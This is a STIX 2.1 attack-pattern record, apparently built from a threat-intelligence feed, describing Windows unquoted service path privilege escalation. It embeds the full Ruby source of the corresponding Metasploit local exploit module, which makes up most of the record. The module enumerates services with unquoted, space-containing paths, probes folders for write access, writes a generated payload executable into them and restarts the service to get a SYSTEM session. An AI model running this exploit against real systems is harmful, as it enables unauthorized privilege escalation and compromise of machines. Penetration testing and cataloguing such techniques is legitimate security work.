{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6e360df-af65-45ed-bc20-49b752a452a4",
    "created": "2024-08-14T16:49:46.46656Z",
    "modified": "2024-08-14T16:49:46.466564Z",
    "name": "Windows Unquoted Service Path Privilege Escalation",
    "description": " This module exploits a logic flaw due to how the lpApplicationName parameter is handled.  When the lpApplicationName contains a space, the file name is ambiguous.  Take this file path as example: C:\\program files\\hello.exe; The Windows API will try to interpret this as two possible paths: C:\\program.exe, and C:\\program files\\hello.exe, and then execute all of them. To some software developers, this is an unexpected behavior, which becomes a security problem if an attacker is able to place a malicious executable in one of these unexpected paths, sometimes escalate privileges if run as SYSTEM. Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the same problem.  The offensive technique is also described in Writing Secure Code (2nd Edition) Chapter 23, in the section \"Calling Processes Security\" on page 676.  This technique was previously called Trusted Service Path, but is more commonly known as Unquoted Service Path.  The service exploited won't start until the payload written to disk is removed.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/unquoted_service_path.rb",
            "external_id": "unquoted_service_path.rb"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Windows::Services\n  include Msf::Exploit::Retry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Unquoted Service Path Privilege Escalation',\n        'Description' => %q{\n          This module exploits a logic flaw due to how the lpApplicationName parameter\n          is handled.  When the lpApplicationName contains a space, the file name is\n          ambiguous.  Take this file path as example: C:\\program files\\hello.exe;\n          The Windows API will try to interpret this as two possible paths:\n          C:\\program.exe, and C:\\program files\\hello.exe, and then execute all of them.\n          To some software developers, this is an unexpected behavior, which becomes a\n          security problem if an attacker is able to place a malicious executable in one\n          of these unexpected paths, sometimes escalate privileges if run as SYSTEM.\n          Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the\n          same problem.\n\n          The offensive technique is also described in Writing Secure Code (2nd Edition),\n          Chapter 23, in the section \"Calling Processes Security\" on page 676.\n\n          This technique was previously called Trusted Service Path, but is more commonly\n          known as Unquoted Service Path.\n\n          The service exploited won't start until the payload written to disk is removed.\n        },\n        'References' => [\n          ['URL', 'http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx'],\n          ['URL', 'http://www.microsoft.com/learning/en/us/book.aspx?id=5957&locale=en-us'], # pg 676\n          ['URL', 'https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae']\n        ],\n        'DisclosureDate' => '2001-10-25',\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sinn3r', # msf module\n          'h00die' # improvements\n        ],\n        'Platform' => [ 'win'],\n        'Targets' => [ ['Windows', {}] ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => { 'WfsDelay' => 300 }, # give a long wait so the box/service can be rebooted\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ],\n          'Reliability' => [ REPEATABLE_SESSION, ]\n        }\n      )\n    )\n  end\n\n  def check\n    services = enum_vuln_services.map { |srv| srv['name'] }\n    if services.empty?\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable(\"Vulnerable services: #{services.join(', ')}\")\n  end\n\n  ###\n  # This function uses a loop to go from the longest potential path (most likely with write access), to shortest.\n  # >> fpath = 'C:\\\\Program Files\\\\A Subfolder\\\\B Subfolder\\\\C Subfolder\\\\SomeExecutable.exe'\n  # >> fpath = fpath.split(' ')[0...-1]\n  # >> fpath.reverse.each { |x| puts fpath[0..fpath.index(x)].join(' ')}\n  # C:\\Program Files\\A Subfolder\\B Subfolder\\C\n  # C:\\Program Files\\A Subfolder\\B\n  # C:\\Program Files\\A\n  # C:\\Program\n  ###\n\n  def generate_folders(fpath, &block)\n    potential_paths = []\n    checked_paths = []\n    finished = false\n    fpath.reverse.each do |x|\n      path = fpath[0..fpath.index(x)].join(' ')\n      # when we test writability, we drop off last part since that is the file name\n      path_no_file = path.split('\\\\')[0...-1].join('\\\\')\n\n      next if checked_paths.include? path_no_file\n\n      checked_paths << path_no_file\n      unless writable?(path_no_file)\n        vprint_error(\"    #{path_no_file}\\\\ is not writable\")\n        next\n      end\n      vprint_good(\"    #{path_no_file}\\\\ is writable\")\n\n      finished = block.call(path)\n      potential_paths << path\n      break if finished\n    end\n\n    [potential_paths, finished]\n  end\n\n  def enum_vuln_services(&block)\n    vuln_services = []\n\n    each_service do |service|\n      info = service_info(service[:name])\n\n      # Sometimes there's a null byte at the end of the string,\n      # and that can break the regex -- annoying.\n      next unless info[:path]\n\n      cmd = info[:path].strip\n\n      # Check path:\n      # - Filter out paths that begin with a quote\n      # - Filter out paths that don't have a space\n      next if cmd !~ /^[a-z]:.+\\.exe$/i\n      next if !cmd.split('\\\\').map { |p| true if p =~ / / }.include?(true)\n\n      vprint_good(\"Found potentially vulnerable service: #{service[:name]} - #{cmd} (#{info[:startname]})\")\n      serv = {\n        'name' => service[:name],\n        'cmd' => cmd\n      }\n      fpath = cmd.split(' ')[0...-1] # cut off the .exe last portion\n      vprint_status('  Enumerating vulnerable paths')\n      serv['paths'], finished = generate_folders(fpath) do |path|\n        block.call(service[:name], path) if block_given?\n      end\n\n      # don't bother saving if we didn't find any vuln paths\n      vuln_services << serv unless serv['paths'].empty?\n      break if finished\n    end\n\n    vuln_services\n  end\n\n  # overwrite the writable? included in file.rb addon since it can't do windows.\n  def writable?(path)\n    f = \"#{path}\\\\#{Rex::Text.rand_text_alphanumeric(4..8)}.txt\"\n    words = Rex::Text.rand_text_alphanumeric(9)\n    begin\n      # path needs to have double, not single quotes\n      c = %(cmd.exe /C echo '#{words}' >> \"#{f}\" && type \"#{f}\" && del \"#{f}\")\n      cmd_exec(c).to_s.include? words\n    rescue Rex::Post::Meterpreter::RequestError => _e\n      false\n    end\n  end\n\n  def exploit\n    print_status('Finding a vulnerable service...')\n\n    @svc_exes = {}\n    enum_vuln_services do |svc_name, path|\n      #\n      # Drop the malicious executable into the path\n      #\n      exe_path = \"#{path}.exe\"\n      print_status(\"      Placing #{exe_path} for #{svc_name}\")\n      exe = @svc_exes[svc_name] ||= generate_payload_exe_service({ servicename: svc_name })\n      print_status(\"      Attempting to write #{exe.length} bytes to #{exe_path}...\")\n      write_file(exe_path, exe)\n      print_good '      Successfully wrote payload'\n      register_file_for_cleanup(exe_path)\n\n      #\n      # Run the service, let the Windows API do the rest\n      #\n      if service_restart(svc_name)\n        sleep 5 # sleep a bit if restarting the service succeeded to see if any sessions are created\n      else\n        print_error '      Unable to restart service. System reboot or an admin restarting the service is required. Payload left on disk!!!'\n      end\n\n      session_created? # propagated up to indicate if we're finished or not\n    end\n\n    # if no exes were created, no vulnerable service paths were found\n    fail_with(Failure::NotVulnerable, 'No service found with trusted path issues') if @svc_exes.empty?\n\n    print_status(\"Waiting #{wfs_delay} seconds for shell to arrive\") unless session_created?\n  end\n\n  def service_restart(name)\n    print_status(\"[#{name}] Restarting service\")\n    super\n  rescue RuntimeError => e\n    print_error(\"[#{name}] Restarting service failed: #{e}\")\n    false\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2001-10-25",
    "x_mitre_platforms": [
        "[ 'win']"
    ]
}